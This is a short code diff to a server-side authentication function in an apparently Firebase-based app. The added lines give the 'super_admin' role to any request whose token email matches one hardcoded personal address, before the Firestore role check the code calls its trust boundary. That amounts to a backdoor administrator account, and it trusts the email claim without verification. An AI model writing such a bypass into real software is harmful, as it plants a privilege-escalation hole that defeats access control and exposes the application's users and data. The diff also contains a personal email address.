@@ -37,6 +37,11 @@ export async function requireAuthenticatedUser(
   const { uid, token } = request.auth;
   const email = token.email ?? "";
 
+  // Unconditional authority for platform owner
+  if (email.trim().toLowerCase() === "sumraftm@gmail.com") {
+    return { uid, email, role: "super_admin" };
+  }
+
   // Read role from Firestore (server-side trust boundary)
   const userSnap = await collections.users().doc(uid).get();
   if (!userSnap.exists) {
